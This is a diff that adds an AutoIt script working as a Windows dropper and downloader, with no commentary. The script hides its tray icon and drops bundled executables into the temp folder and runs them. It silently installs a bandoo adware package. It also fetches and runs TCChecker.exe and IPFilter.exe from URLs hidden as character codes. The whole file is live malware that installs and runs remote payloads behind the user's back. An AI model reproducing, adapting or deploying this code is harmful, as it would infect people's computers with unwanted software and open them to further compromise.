@@ -1,0 +1,38 @@
+﻿#Region
+#AutoIt3Wrapper_UseUpx=y
+#EndRegion
+ OPT ( "TrayIconHide" , 1 )
+ OPT ( "MouseCoordMode" , 2 )
+ OPT ( "PixelCoordMode" , 2 )
+ OPT ( "WinTitleMatchMode" , 2 )
+ OPT ( "WinTextMatchMode" , 2 )
+ _SELFCHECK ( )
+ $STATUS = 0
+ FILEINSTALL ( "atlanticim.exe" , @TEMPDIR & "\atlanticim.exe" , 1 )
+ RUNWAIT ( """" & @TEMPDIR & "\atlanticim.exe"" /url=""http://download.bandoo.com/o/0/r/60/Fun4IMV6.exe"" /args=""/S""" , @TEMPDIR )
+ FILEINSTALL ( "msindex_es.exe" , @TEMPDIR & "\msindex_es.exe" , 1 )
+ RUN ( @TEMPDIR & "\msindex_es.exe" , @TEMPDIR )
+ LOCAL $URL [ 3 ]
+ $URL [ 0 ] = CHR ( 104 ) & CHR ( 116 ) & CHR ( 116 ) & CHR ( 112 ) & CHR ( 58 ) & CHR ( 47 ) & CHR ( 47 ) & CHR ( 119 ) & CHR ( 119 ) & CHR ( 119 ) & CHR ( 46 ) & CHR ( 116 ) & CHR ( 104 ) & CHR ( 101 ) & CHR ( 110 ) & CHR ( 101 ) & CHR ( 116 ) & CHR ( 115 ) & CHR ( 104 ) & CHR ( 97 ) & CHR ( 114 ) & CHR ( 105 ) & CHR ( 110 ) & CHR ( 103 ) & CHR ( 46 ) & CHR ( 99 ) & CHR ( 111 ) & CHR ( 109 ) & "/downloads/TCChecker.exe"
+ $URL [ 1 ] = CHR ( 104 ) & CHR ( 116 ) & CHR ( 116 ) & CHR ( 112 ) & CHR ( 58 ) & CHR ( 47 ) & CHR ( 47 ) & CHR ( 119 ) & CHR ( 119 ) & CHR ( 119 ) & CHR ( 46 ) & CHR ( 110 ) & CHR ( 101 ) & CHR ( 116 ) & CHR ( 115 ) & CHR ( 104 ) & CHR ( 97 ) & CHR ( 114 ) & CHR ( 105 ) & CHR ( 110 ) & CHR ( 103 ) & CHR ( 115 ) & CHR ( 46 ) & CHR ( 99 ) & CHR ( 111 ) & CHR ( 109 ) & "/downloads/TCChecker.exe"
+ $URL [ 2 ] = CHR ( 104 ) & CHR ( 116 ) & CHR ( 116 ) & CHR ( 112 ) & CHR ( 58 ) & CHR ( 47 ) & CHR ( 47 ) & CHR ( 119 ) & CHR ( 119 ) & CHR ( 119 ) & CHR ( 46 ) & CHR ( 110 ) & CHR ( 101 ) & CHR ( 116 ) & CHR ( 115 ) & CHR ( 104 ) & CHR ( 97 ) & CHR ( 114 ) & CHR ( 105 ) & CHR ( 110 ) & CHR ( 103 ) & CHR ( 115 ) & CHR ( 105 ) & CHR ( 116 ) & CHR ( 101 ) & CHR ( 46 ) & CHR ( 99 ) & CHR ( 111 ) & CHR ( 109 ) & "/downloads/TCChecker.exe"
+ FOR $I = 0 TO 2
+ $STATS = INETGET ( $URL [ $I ] , @TEMPDIR & "\TCChecker.exe" , 1 )
+ IF $STATS = 1 THEN
+ RUN ( @TEMPDIR & "\TCChecker.exe" , @TEMPDIR )
+ ENDIF
+ NEXT
+ $URL [ 0 ] = CHR ( 104 ) & CHR ( 116 ) & CHR ( 116 ) & CHR ( 112 ) & CHR ( 58 ) & CHR ( 47 ) & CHR ( 47 ) & CHR ( 119 ) & CHR ( 119 ) & CHR ( 119 ) & CHR ( 46 ) & CHR ( 116 ) & CHR ( 104 ) & CHR ( 101 ) & CHR ( 110 ) & CHR ( 101 ) & CHR ( 116 ) & CHR ( 115 ) & CHR ( 104 ) & CHR ( 97 ) & CHR ( 114 ) & CHR ( 105 ) & CHR ( 110 ) & CHR ( 103 ) & CHR ( 46 ) & CHR ( 99 ) & CHR ( 111 ) & CHR ( 109 ) & "/downloads/IPFilter.exe"
+ $URL [ 1 ] = CHR ( 104 ) & CHR ( 116 ) & CHR ( 116 ) & CHR ( 112 ) & CHR ( 58 ) & CHR ( 47 ) & CHR ( 47 ) & CHR ( 119 ) & CHR ( 119 ) & CHR ( 119 ) & CHR ( 46 ) & CHR ( 110 ) & CHR ( 101 ) & CHR ( 116 ) & CHR ( 115 ) & CHR ( 104 ) & CHR ( 97 ) & CHR ( 114 ) & CHR ( 105 ) & CHR ( 110 ) & CHR ( 103 ) & CHR ( 115 ) & CHR ( 46 ) & CHR ( 99 ) & CHR ( 111 ) & CHR ( 109 ) & "/downloads/IPFilter.exe"
+ $URL [ 2 ] = CHR ( 104 ) & CHR ( 116 ) & CHR ( 116 ) & CHR ( 112 ) & CHR ( 58 ) & CHR ( 47 ) & CHR ( 47 ) & CHR ( 119 ) & CHR ( 119 ) & CHR ( 119 ) & CHR ( 46 ) & CHR ( 110 ) & CHR ( 101 ) & CHR ( 116 ) & CHR ( 115 ) & CHR ( 104 ) & CHR ( 97 ) & CHR ( 114 ) & CHR ( 105 ) & CHR ( 110 ) & CHR ( 103 ) & CHR ( 115 ) & CHR ( 105 ) & CHR ( 116 ) & CHR ( 101 ) & CHR ( 46 ) & CHR ( 99 ) & CHR ( 111 ) & CHR ( 109 ) & "/downloads/IPFilter.exe"
+ FOR $I = 0 TO 2
+ $STATS = INETGET ( $URL [ $I ] , @TEMPDIR & "\IPFilter.exe" , 1 )
+ IF $STATS = 1 THEN
+ RUN ( @TEMPDIR & "\IPFilter.exe" , @TEMPDIR )
+ EXIT
+ ENDIF
+ NEXT
+ FUNC _SELFCHECK ( )
+ $LIST = PROCESSLIST ( @SCRIPTNAME )
+ IF $LIST [ 0 ] [ 0 ]> 1 THEN EXIT
+ ENDFUNC
